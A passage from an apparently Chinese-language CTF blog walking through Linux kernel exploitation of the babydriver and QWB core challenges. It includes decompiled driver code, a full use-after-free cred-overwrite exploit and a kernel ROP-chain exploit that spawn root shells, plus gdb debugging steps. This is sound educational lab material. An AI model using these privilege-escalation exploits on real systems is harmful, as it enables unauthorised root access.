mount -t proc none /proc   4   │ mount -t sysfs none /sys   5   │ mount -t devtmpfs devtmpfs /dev   6   │ chown root:root flag   7   │ chmod 400 flag   8   │ exec 0&lt;/dev/console   9   │ exec 1&gt;/dev/console  10   │ exec 2&gt;/dev/console  11   │  12   │ insmod /lib/modules/4.4.72/babydriver.ko  13   │ chmod 777 /dev/babydev  14   │ echo -e &quot;\nBoot took $(cut -d&#39; &#39; -f1 /proc/uptime) seconds\n&quot;  15   │ setsid cttyhack setuidgid 1000 sh  16   │  17   │ umount /proc  18   │ umount /sys  19   │ poweroff -d 0  -f  20   │───────┴────────────────────────────────────────────────────────────────────────</code></pre><p>接下来看 <code>babydriver.ko</code> 的相关保护，和 ELF 是类似的这里只开了 NX：</p><pre><code class="bash">$ file babydriver.kobabydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, not stripped$ checksec ./babydriver.ko    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x0)</code></pre><p>接下来进 IDA 看看有哪些函数。先了解一个<a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cdev.h#L12" target="_blank" rel="noopener">结构体 <code>cdev</code></a>（每个字符设备都对应一个 <code>cdev</code> 结构的变量）：</p><pre><code class="cpp">struct cdev {    struct kobject kobj; // 每个cdev都是一个kobject    struct module *owner; // owner指向实现驱动的模块    const struct file_operations *ops; // 操纵这个字符设备的方法    struct list_head list; // 与cdev对应的字符设备文件的inode链表头    dev_t dev; // 起始设备编号    unsigned int count; // 设备范围号大小};</code></pre><p>首先是模块的入口函数 <code>babydriver_init</code>，主要是一系列对 <code>/dev/babydev</code> 设备的注册：</p><pre><code class="cpp">int __cdecl babydriver_init(){  int v0; // edx  __int64 v1; // rsi  int v2; // ebx  class *v3; // rax  __int64 v4; // rax  if ( (signed int)alloc_chrdev_region(&amp;babydev_no, 0LL, 1LL, &quot;babydev&quot;) &gt;= 0 ) // 动态分配设备编号  {    cdev_init(&amp;cdev_0, &amp;fops); // 静态初始化cdev    v1 = babydev_no;    cdev_0.owner = &amp;_this_module; // 设置owner为指定模块    v2 = cdev_add(&amp;cdev_0, babydev_no, 1LL); // 将cdev添加到系统中    if ( v2 &gt;= 0 )    {      v3 = (class *)_class_create(&amp;_this_module, &quot;babydev&quot;, &amp;babydev_no); // 将babydev注册到内核中      babydev_class = v3;      if ( v3 )      {        v4 = device_create(v3, 0LL, babydev_no, 0LL, &quot;babydev&quot;); // 创建设备节点        v0 = 0;        if ( v4 ) // 创建成功          return v0;        printk(&amp;unk_351, 0LL); // 创建设备节点失败        class_destroy(babydev_class); // 取消注册      }      else // 注册失败      {        printk(&amp;unk_33B, &quot;babydev&quot;);      }      cdev_del(&amp;cdev_0); // 从系统中删除cdev    }    else // 分配失败    {      printk(&amp;unk_327, v1);    }    unregister_chrdev_region(babydev_no, 1LL); // 释放设备号    return v2;  }  printk(&amp;unk_309, 0LL);  return 1;}</code></pre><p>然后在模块退出函数中对设备等进行删除和释放资源：</p><pre><code class="cpp">void __cdecl babydriver_exit(){  device_destroy(babydev_class, babydev_no);  class_destroy(babydev_class);  cdev_del(&amp;cdev_0);  unregister_chrdev_region(babydev_no, 1LL);}</code></pre><p>在 <code>babyioctl</code> 中可以看到模块中有一个结构体 <code>babydev_struct</code>。首先调用 <code>kfree</code> 释放对应的 <code>device_buf</code>，然后调用 <code>kmalloc</code> 指定大小的内存，并设置 <code>device_buf_len</code>：</p><pre><code class="cpp">// local variable allocation has failed, the output may be wrong!__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg){  size_t v3; // rdx  size_t len; // rbx  __int64 result; // rax  _fentry__(filp, *(_QWORD *)&amp;command, arg);  len = v3;  if ( command == 0x10001 )  {    kfree(babydev_struct.device_buf);    babydev_struct.device_buf = (char *)_kmalloc(len, 0x24000C0LL);    babydev_struct.device_buf_len = len;    printk(&quot;alloc done\n&quot;, 0x24000C0LL);    result = 0LL;  }  else  {    printk(&amp;unk_2EB, v3);    result = -22LL;  }  return result;}</code></pre><p>在 <code>babyopen</code> 中打开：</p><pre><code class="cpp">int __fastcall babyopen(inode *inode, file *filp){  _fentry__(inode, filp);  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);  babydev_struct.device_buf_len = 0x40LL;  printk(&quot;device open\n&quot;, 0x24000C0LL);  return 0;}</code></pre><p><code>babyread</code> 中调用 <code>copy_to_user</code> 从 <code>babydev_struct.device_buf</code> 读取指定的字符串到用户空间：</p><pre><code class="cpp">ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset){  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &lt;= v4 )    return result;  v6 = v4;  copy_to_user(buffer);  result = v6;  return result;}</code></pre><p><code>babywrite</code> 调用 <code>copy_from_user</code> 读一段数据到 <code>babydev_struct.device_buf</code> 上：</p><pre><code class="cpp">ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset){  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &lt;= v4 )    return result;  v6 = v4;  copy_from_user();  result = v6;  return result;}</code></pre><p>最后 <code>babyrelease</code> 函数将 <code>device_buf</code> 对应的内存释放：</p><pre><code class="cpp">int __fastcall babyrelease(inode *inode, file *filp){  _fentry__(inode, filp);  kfree(babydev_struct.device_buf);  printk(&quot;device release\n&quot;, filp);  return 0;}</code></pre><p>这里的漏洞在于 <code>babyopen</code> 处没有检查打开了几个设备，存在 Use After Free，具体利用方法如下：</p><ol><li>打开两次 <code>/dev/babydev</code>，第二次的分配会覆盖到第一次分配的内存，然后释放第一次分配的内存；</li><li>创建一个新进程，新进程中的 <code>cred</code> 结构体和之前释放的重叠，也就是修改第二次的 <code>babydev</code> 就能改到新进程的 <code>cred</code> 结构体；</li><li>创建时将第二次的 <code>babydev</code> 改成对应 <code>cred</code> 结构体的大小（如下），然后把对应偏移处的 <code>gid</code> 和 <code>uid</code> 改为 0，就实现了提权到 root。</li></ol><pre><code class="cpp">struct cred {    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC    0x43736564#define CRED_MAGIC_DEAD    0x44656144#endif    kuid_t        uid;        /* real UID of the task */    kgid_t        gid;        /* real GID of the task */    kuid_t        suid;        /* saved UID of the task */    kgid_t        sgid;        /* saved GID of the task */    kuid_t        euid;        /* effective UID of the task */    kgid_t        egid;        /* effective GID of the task */    kuid_t        fsuid;        /* UID for VFS ops */    kgid_t        fsgid;        /* GID for VFS ops */    unsigned    securebits;    /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;    /* caps we&#39;re permitted */    kernel_cap_t    cap_effective;    /* caps we can actually use */    kernel_cap_t    cap_bset;    /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char    jit_keyring;    /* default keyring to attach requested                     * keys to */    struct key __rcu *session_keyring; /* keyring inherited over fork */    struct key    *process_keyring; /* keyring private to this process */    struct key    *thread_keyring; /* keyring private to this thread */    struct key    *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;    /* subjective LSM security */#endif    struct user_struct *user;    /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct group_info *group_info;    /* supplementary groups for euid/fsgid */    struct rcu_head    rcu;        /* RCU deletion hook */};</code></pre><p>Exploit：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main() {    int fd1, fd2, pid;    fd1 = open(&quot;/dev/babydev&quot;, 2);    fd2 = open(&quot;/dev/babydev&quot;, 2);    ioctl(fd1, 0x10001, 0xa8); // 修改babydev_struct.device_buf_len的长度为cred结构体的长度    close(fd1); // 释放第一次的内存    pid = fork(); // 创建进程    if (pid &lt; 0) {        puts(&quot;[!] fork error...&quot;);        exit(-1);    } else if (pid == 0) { // 子进程        uint8_t fake_cred[30];        memset(fake_cred, 0, sizeof(fake_cred));        write(fd2, fake_cred, 28);        if (getuid() == 0) {            puts(&quot;[+] get root!&quot;);            system(&quot;/bin/sh&quot;);            exit(0);        }    } else {        wait(NULL);    }    close(fd2);    return 0;}</code></pre><p>因为文件系统中没有 Library，需要静态编译才能正常执行。然后打包新的文件系统后运行 <code>boot.sh</code>：</p><pre><code class="bash">$ makecc -static    exp.c   -o exp$ file ./exp./exp: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=8af26f6763d0d44db98089ae847f6104a4054c93, not stripped$ cd fs/ &amp;&amp; find . | cpio -o --format=newc &gt; ../rootfs.cpio7349 blocks$ cd .. &amp;&amp; sudo ./boot.sh</code></pre><p>使用 lsmod 可以查看加载模块的基地址：</p><pre><code class="bash">/ $ lsmodbabydriver 16384 0 - Live 0xffffffffc0000000 (OE)/ $ iduid=1000(ctf) gid=1000(ctf) groups=1000(ctf)/ $ cat flagcat: can&#39;t open &#39;flag&#39;: Permission denied/ $ /tmp/exp[   23.769095] device open[   23.773231] device open[   23.775415] alloc done[   23.784434] device release[+] get root!/ # iduid=0(root) gid=0(root) groups=1000(ctf)/ # cat flagflag{this_is_a_flag}/ #</code></pre><blockquote><p><a href="http://p4nda.top/2018/10/11/ciscn-2017-babydriver/" target="_blank" rel="noopener">P4nda</a> 以及 <a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">Anceity</a> 两位大佬都提供了 ROP 的做法。</p></blockquote><h1 id="Kernel-ROP（QWB-2018-core）"><a href="#Kernel-ROP（QWB-2018-core）" class="headerlink" title="Kernel ROP（QWB-2018-core）"></a>Kernel ROP（QWB-2018-core）</h1><p>题目给了四个文件，vmlinux 即为 bzImage 未解压缩的版本（可以用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener"><code>extract-vmlinux</code></a> 来对 <code>bzImage</code> 解压缩）。<code>start.sh</code> 是一个启动脚本，其中可以看到开了 <code>kalsr</code>：</p><pre><code class="bash">$ tar -zxvf core_give.tar.gz./give_to_player/./give_to_player/bzImage./give_to_player/vmlinux./give_to_player/core.cpio./give_to_player/start.sh$ bat start.sh───────┬────────────────────────────────────────────────────────────────────────       │ File: start.sh───────┼────────────────────────────────────────────────────────────────────────   1   │ qemu-system-x86_64 \   2   │ -m 64M \   3   │ -kernel ./bzImage \   4   │ -initrd  ./core.cpio \   5   │ -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;       │  \   6   │ -s  \   7   │ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \   8   │ -nographic  \</code></pre><p>然后跟前面一样看一下看看文件系统里有啥，<code>init</code> 同样可以得到很多信息，：</p><ul><li>第 9 行把 <code>/proc/kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code>，那么就可以从 <code>/tmp/kallsyms</code> 中读取到 <code>commit_creds</code> 和 <code>prepare_kernel_cred</code> 的地址；</li><li>第 10 行把 <code>kptr_restrict</code> 设为 1，禁止通过 <code>/proc/kallsyms</code> 查看函数地址，不过前面已经把其中的信息保存到了一个可读的文件中；</li><li>第 11 行把 <code>dmesg_restrict</code> 设为 1，禁止使用 dmesg；</li><li>第 18 行设置了定时关机，为了避免做题时产生干扰，可以直接把这句删掉然后重新打包。</li></ul><pre><code class="bash">$ file core.cpiocore.cpio: gzip compressed data, last modified: Fri Oct  5 14:08:36 2018, max compression, from Unix$ mv core.cpio core.cpio.gz$ gunzip ./core.cpio.gz$ lscore.cpio$ file ./core.cpio./core.cpio: ASCII cpio archive (SVR4 with no CRC)$ cpio -idmv &lt; ./core.cpio.usrusr/sbin...initetcetc/groupetc/passwdlib64lib64/ld-linux-x86-64.so.2lib64/libc.so.6lib64/libm.so.6...gen_cpio.shbin...vmlinuxrootlinuxrcliblib/modules...tmpcore.cpiocore.ko129851 blocks$ bat init───────┬────────────────────────────────────────────────────────────────────────       │ File: init───────┼────────────────────────────────────────────────────────────────────────   1   │ #!/bin/sh   2   │ mount -t proc proc /proc   3   │ mount -t sysfs sysfs /sys   4   │ mount -t devtmpfs none /dev   5   │ /sbin/mdev -s   6   │ mkdir -p /dev/pts   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts   8   │ chmod 666 /dev/ptmx   9   │ cat /proc/kallsyms &gt; /tmp/kallsyms  10   │ echo 1 &gt; /proc/sys/kernel/kptr_restrict  11   │ echo 1 &gt; /proc/sys/kernel/dmesg_restrict  12   │ ifconfig eth0 up  13   │ udhcpc -i eth0  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0  15   │ route add default gw 10.0.2.2  16   │ insmod /core.ko  17   │  18   │ poweroff -d 120 -f &amp;  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh  20   │ echo &#39;sh end!\n&#39;  21   │ umount /proc  22   │ umount /sys  23   │  24   │ poweroff -d 0  -f───────┴────────────────────────────────────────────────────────────────────────</code></pre><blockquote><ul><li>可以使用 <code>gen_cpio.sh</code> 重新打包；</li><li>如果不能正常启动，将 QEMU 的内存参数改为 128M。</li></ul></blockquote><p>接下来对模块文件进行分析。可以开导开了 Canary 和 NX：</p><pre><code class="bash">$ file ./core.ko./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=54943668385c6573ec1b40a7c06127d9423103b3, not stripped$ checksec ./core.ko    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x0)</code></pre><p>模块入口函数中注册了 <code>/proc/core</code>：</p><pre><code class="cpp">__int64 init_module(){  core_proc = proc_create(&quot;core&quot;, 438LL, 0LL, &amp;core_fops);  printk(&amp;unk_2DE);  return 0LL;}</code></pre><p>在退出函数中删除 <code>/proc/core</code>：</p><pre><code class="cpp">__int64 exit_core(){  __int64 result; // rax  if ( core_proc )    result = remove_proc_entry(&quot;core&quot;);  return result;}</code></pre><p>在 <code>core_ioctl</code> 中有一条 Switch 语句，分别对应 <code>core_read</code>、设置全局变量 <code>off</code> 的值以及 <code>core_copy_func</code>：</p><pre><code class="cpp">__int64 __fastcall core_ioctl(__int64 a1, int c, __int64 data_1){  __int64 data; // rbx  data = data_1;  switch ( c )  {    case 0x6677889B:      core_read(data_1);      break;    case 0x6677889C:      printk(&amp;unk_2CD);      off = data;      break;    case 0x6677889A:      printk(&amp;unk_2B3);      core_copy_func(data);      break;  }  return 0LL;}</code></pre><p><code>core_read</code> 从 <code>v5+off</code> 的位置复制 0x40 个字节到用户空间，也就是可以进行任意读：</p><pre><code class="cpp">unsigned __int64 __fastcall core_read(__int64 a1){  __int64 v1; // rbx  char *v2; // rdi  signed __int64 i; // rcx  unsigned __int64 result; // rax  char v5; // [rsp+0h] [rbp-50h]  unsigned __int64 v6; // [rsp+40h] [rbp-10h]  v1 = a1;  v6 = __readgsqword(0x28u);  printk(&amp;unk_25B);  printk(&amp;unk_275);  v2 = &amp;v5;  for ( i = 0x10LL; i; --i )  {    *(_DWORD *)v2 = 0; // memset(v2, 0, sizeof(v2))    v2 += 4;  }  strcpy(&amp;v5, &quot;Welcome to the QWB CTF challenge.\n&quot;);  result = copy_to_user(v1, &amp;v5 + off, 0x40LL);  if ( !result )    return __readgsqword(0x28u) ^ v6;  __asm { swapgs }  return result;}</code></pre><p><code>core_copy_func</code> 则是从全局变量 <code>name</code> 中复制指定长度的内容到局部变量 <code>buf</code> 上。且传入的长度是有符号整型 <code>signed __int64</code>，而 <code>qmemcpy</code> 的长度使用的是无符号整型 <code>unsigned __int16</code>，可以通过溢出来绕过前面的检查：</p><pre><code class="cpp">signed __int64 __fastcall core_copy_func(signed __int64 len){  signed __int64 result; // rax  __int64 buf; // [rsp+0h] [rbp-50h]  unsigned __int64 v3; // [rsp+40h] [rbp-10h]  v3 = __readgsqword(0x28u);  printk(&amp;unk_215);  if ( len &gt; 0x3F )  {    printk(&amp;unk_2A1);    result = 0xFFFFFFFFLL;  }  else  {    result = 0LL;    qmemcpy(&amp;buf, &amp;name, (unsigned __int16)len);  }  return result;}</code></pre><p><code>core_write</code> 往全局变量 <code>name</code> 上写指定内容：</p><pre><code class="cpp">signed __int64 __fastcall core_write(__int64 a1, __int64 buf, unsigned __int64 a3){  unsigned __int64 len; // rbx  len = a3;  printk(&amp;unk_215);  if ( len &lt;= 0x800 &amp;&amp; !copy_from_user(&amp;name, buf, len) )    return (unsigned int)len;  printk(&amp;unk_230);  return 0xFFFFFFF2LL;}</code></pre><p>最后 <code>core_release</code> 只是有一个 printk 输出：</p><pre><code class="cpp">__int64 core_release(){  printk(&amp;unk_204);  return 0LL;}</code></pre><p>综上整理一下不难发现，我们可以任意地址读、可以往一个全局变量和一个函数中的局部变量写，那么就有下面的 ROP 思路：</p><ol><li>使用 <code>ioctl</code> 设置全局变量 <code>off</code>，然后调用 <code>core_read</code> 来泄漏 Canary；</li><li>使用 <code>core_write</code> 向 <code>name</code> 写入 ROP 链（构造 <code>commit_creds(prepare_kernel_cred(0))</code>，地址通过 <code>/tmp/kallsyms</code> 中的内容获取）；</li><li>使用 <code>core_copy_func</code> 把 <code>name</code> 上构造的 ROP 链写到局部变量上；</li><li>最后返回用户态调用 <code>system(&quot;/bin/sh&quot;)</code>（通过 <code>swapgs ; iretq</code> 两条指令来恢复寄存器和返回用户态）。</li></ol><blockquote><p>关于找 Gadget 的方法，M4x 师傅说是用 ropper，但我个人感觉 ROPgadget 更快。</p><pre><code class="bash">$ ROPgadget --binary ./vmlinux &gt; gadgets</code></pre><p><code>ireq</code> 可以用 objdump 来找。</p></blockquote><p>TODO</p><p>Exploit：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;void spawn_shell() {  if (!getuid()) {        system(&quot;/bin/sh&quot;);        exit(0);    } else {        puts(&quot;[!] UID != 0&quot;);        exit(-1);    }}size_t commit_creds, prepare_kernel_cred;size_t raw_vmlinux_base = 0xffffffff81000000;size_t vmlinux_base = 0;size_t find_symbols() {    FILE *kallsyms_fd = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);    if (kallsyms_fd &lt; 0) {        puts(&quot;[!] Open /tmp/kallsyms error...&quot;);        exit(-1);    }    char buf[0x30];    while(fgets(buf, 0x30, kallsyms_fd)) {        if (commit_creds &amp; prepare_kernel_cred)            return 0;        if (strstr(buf, &quot;commit_creds&quot;) &amp;&amp; !commit_creds) {            char hex[20];            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;commit_creds);            printf(&quot;commit_creds =&gt; %p.\n&quot;, commit_creds);            vmlinux_base = commit_creds - 0x9c8e0;            printf(&quot;vmlinux_base =&gt; %p.\n&quot;, vmlinux_base);        }        if (strstr(buf, &quot;prepare_kernel_cred&quot;) &amp;&amp; !prepare_kernel_cred) {            char hex[20];            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;prepare_kernel_cred);            printf(&quot;prepare_kernel_cred =&gt; %p.\n&quot;, prepare_kernel_cred);            vmlinux_base = prepare_kernel_cred - 0x9cce0;            printf(&quot;vmlinux_base =&gt; %p.\n&quot;, vmlinux_base);        }    }    if (!(prepare_kernel_cred &amp; commit_creds)) {        puts(&quot;[*] Error...&quot;);        exit(-1);    }}size_t user_cs, user_ss, user_rflags, user_sp;void save_status() {    __asm__(        &quot;mov user_cs, cs;\n&quot;        &quot;mov user_ss, ss;\n&quot;        &quot;mov user_sp, sp;\n&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;\n&quot;    );    puts(&quot;[*] User status has been saved.&quot;);}void set_off(int fd, long long idx) {    printf(&quot;[*] Set off = %ld.\n&quot;, idx);    ioctl(fd, 0x6677889C, idx);}void core_read(int fd, char *buf) {    puts(&quot;[*] Read to buf!&quot;);    ioctl(fd, 0x6677889B, buf);}void core_copy_func(int fd, long long size) {    printf(&quot;[*] Copy %ld byte(s) from user.\n&quot;, size);    ioctl(fd, 0x6677889A, size);}uint64_t pop_rdi_ret = 0xffffffff81000b2f;uint64_t pop_rdx_ret = 0xffffffff810a0f49;uint64_t pop_rcx_ret = 0xffffffff81021e53;uint64_t mov_rdi_rax_call_rdx = 0xffffffff8101aa6a;uint64_t swapgs_popfq_ret = 0xffffffff81a012da;uint64_t iretq_ret = 0xffffffff81050ac2;int main() {    save_status();    int fd = open(&quot;/proc/core&quot;, 2);    if(fd &lt; 0) {        puts(&quot;[*] Open /proc/core error...&quot;);        exit(-1);    }    find_symbols();    // gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;    ssize_t offset = vmlinux_base - raw_vmlinux_base;    set_off(fd, 0x40);    char buf[0x40];    core_read(fd, buf);    size_t canary = ((size_t *)buf)[0];    printf(&quot;[+] Canary = %p\n&quot;, canary);    size_t rop[0x1000] = {0};    int i;    for (i = 0; i &lt; 10; i++)        rop[i] = canary;    // prepare_kernel_cred(0)    rop[i++] = pop_rdi_ret + offset;    rop[i++] = 0;    rop[i++] = prepare_kernel_cred;    // ...    rop[i++] = pop_rdx_ret + offset; // pop rdx ; ret    rop[i++] = pop_rcx_ret + offset; // pop rcx ; ret    rop[i++] = mov_rdi_rax_call_rdx + offset; // mov rdi, rax ; call rdx    rop[i++] = commit_creds;    // Restore registers    rop[i++] = swapgs_popfq_ret + offset;    rop[i++] = 0;    rop[i++] = iretq_ret + offset;    rop[i++] = (size_t)spawn_shell; // rip    rop[i++] = user_cs;    rop[i++] = user_rflags;    rop[i++] = user_sp;    rop[i++] = user_ss;    write(fd, rop, 0x800); // Write rop chain    core_copy_func(fd, 0xffffffffffff0000 | (0x100));    return 0;}</code></pre><h1 id="Debug-with-gdb"><a href="#Debug-with-gdb" class="headerlink" title="Debug with gdb"></a>Debug with gdb</h1><p>进行调试的话一般要先在 QEMU 启动脚本中添加 <code>-gdb tcp::1234</code> 参数（<code>-s</code> 参数同理）。然后用 <code>gdb ./vmlinux</code> 启动 GDB（如果没有 <code>vmlinux</code> 需要提前提取）。接下来在 gdb 中添加调试符号：</p><pre><code class="gdb">add-symbol-file /path/to/lkms/example.ko [offset]</code></pre><blockquote><p><code>offset</code> 的值通过在 QEMU 中运行 lsmod 来得到：</p><pre><code class="bash">/ $ lsmodcore 16384 0 - Live 0xffffffffc0211000 (O)</code></pre><p>或者可以修改启动脚本以 root 权限来查看 <code>/sys/module/core/sections/.text</code> 段的值：</p><pre><code class="bash">/ # cat /sys/module/core/sections/.text0xffffffffc0211000</code></pre></blockquote><p>然后就可以 <code>target remote localhost:1234</code> 开始调试了：</p><pre><code class="bash">$ gdb ./vmlinux -qGEF for linux ready, type `gef&#39; to start, `gef config&#39; to configure80 commands loaded for GDB 7.11.1 using Python engine 3.5Reading symbols from ./vmlinux...(no debugging symbols found)...done.gef➤  add-symbol-file fs/core.ko 0xffffffffc027a000add symbol table from file &quot;fs/core.ko&quot; at    .text_addr = 0xffffffffc027a000Reading symbols from fs/core.ko...(no debugging symbols found)...done.gef➤  b core_readBreakpoint 1 at 0xffffffffc027a063gef➤  target remote localhost:1234Remote debugging using localhost:12340xffffffffa6a6e7d2 in ?? ()[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax   : 0xffffffffa6a6e7d0  →  0x2e66001f0fc3f4fb  →  0x2e66001f0fc3f4fb$rbx   : 0xffffffffa7410480  →  0x0000000080000000  →  0x0000000080000000$rcx   : 0x0000000000000000  →  0x0000000000000000$rdx   : 0x0000000000000000  →  0x0000000000000000$rsp   : 0xffffffffa7403eb8  →   movabs al, ds:0xc2ffffffffa62b65$rbp   : 0x0000000000000000  →  0x0000000000000000$rsi   : 0x0000000000000000  →  0x0000000000000000$rdi   : 0x0000000000000000  →  0x0000000000000000$rip   : 0xffffffffa6a6e7d2  →  0x1f0f2e66001f0fc3  →  0x1f0f2e66001f0fc3$r8    : 0xffff8d484641bf20  →   (bad)$r9    : 0x0000000000000000  →  0x0000000000000000$r10   : 0x0000000000000000  →  0x0000000000000000$r11   : 0x000000000000018c  →  0x000000000000018c$r12   : 0xffffffffa7410480  →  0x0000000080000000  →  0x0000000080000000$r13   : 0xffffffffa7410480  →  0x0000000080000000  →  0x0000000080000000$r14   : 0x0000000000000000  →  0x0000000000000000$r15   : 0x0000000000000000  →  0x0000000000000000$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000───────────────────────────────────────────────────────────────────── stack ────[!] Unmapped address─────────────────────────────────────────────────────────────── code:x86:64 ────   0xffffffffa6a6e7cf                  nop   0xffffffffa6a6e7d0                  sti   0xffffffffa6a6e7d1                  hlt   0xffffffffa6a6e7d2                  ret   0xffffffffa6a6e7d3                  nop    DWORD PTR [rax]   0xffffffffa6a6e7d6                  nop    WORD PTR cs:[rax+rax*1+0x0]   0xffffffffa6a6e7e0                  mov    rax, QWORD PTR gs:0x14d40   0xffffffffa6a6e7e9                  or     BYTE PTR ds:[rax+0x2], 0x20   0xffffffffa6a6e7ee                  mov    rdx, QWORD PTR [rax]─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, stopped 0xffffffffa6a6e7d2 in ?? (), reason: SIGTRAP───────────────────────────────────────────────────────────────────── trace ────[#0] 0xffffffffa6a6e7d2 → ret[#1] 0xffffffffa62b65a0 → jmp 0xffffffffa62b6541[#2] 0xc2 → irq_stack_union()[#3] 0xffffffffa78c4900 → int3[#4] 0xffff8d48466d4900 → jb 0xffff8d48466d4971[#5] 0xffffffffa78cc2c0 → int3────────────────────────────────────────────────────────────────────────────────gef➤</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/</a><br><a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/" target="_blank" rel="noopener">http://m4x.fun/post/linux-kernel-pwn-abc-1/</a><br><a href="https://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html" target="_blank" rel="noopener">https://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html</a><br><a href="https://blog.csdn.net/jhyboss/article/details/76505873" target="_blank" rel="noopener">https://blog.csdn.net/jhyboss/article/details/76505873</a><br><a href="https://www.cnblogs.com/skywang12345/archive/2013/05/15/driver_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/skywang12345/archive/2013/05/15/driver_class.html</a><br><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86490</a><br><a href="https://blog.csdn.net/m0_38100569/article/details/100673103" target="_blank" rel="noopener">https://blog.csdn.net/m0_38100569/article/details/100673103</a><br><a href="http://eternalsakura13.com/2018/03/31/b_core/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/03/31/b_core/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;初涉 Kernel Exploit。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>House of All in One</title>
    <link href="blog.b3ale.cn/2020/04/25/%5BTODO%5DHouse-of-All-in-One/"/>
    <id>blog.b3ale.cn/2020/04/25/%5BTODO%5DHouse-of-All-in-One/</id>
    <published>2020-04-25T15:39:50.000Z</published>
    <updated>2020-05-03T13:50:44.006Z</updated>
    
    <content type="html"><![CDATA[<p><code>House-of-*</code> 是对堆漏洞利用的一系列技术，起源于一篇叫做 Malleus Maleficarum（也有一本中世纪的时候有关女巫的条约的书叫做<a href="https://en.wikipedia.org/wiki/Malleus_Maleficarum" target="_blank" rel="noopener">女巫之槌</a>）的文章。</p><a id="more"></a><h1 id="Malleus-Maleficarum"><a href="#Malleus-Maleficarum" class="headerlink" title="Malleus Maleficarum"></a><a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt" target="_blank" rel="noopener">Malleus Maleficarum</a></h1><h2 id="House-of-Prime-glibc-2-3-5"><a href="#House-of-Prime-glibc-2-3-5" class="headerlink" title="House of Prime (glibc-2.3.5)"></a>House of Prime (glibc-2.3.5)</h2><p>TODO</p><p>(<a href="https://gbmaster.wordpress.com/2014/08/24/x86-exploitation-101-this-is-the-first-witchy-house/" target="_blank" rel="noopener">X86 EXPLOITATION 101: THIS IS THE FIRST WITCHY HOUSE</a>)</p><pre><code class="cpp">void_int_free(mstate av, Void_t* mem){    mchunkptr       p;           /* chunk 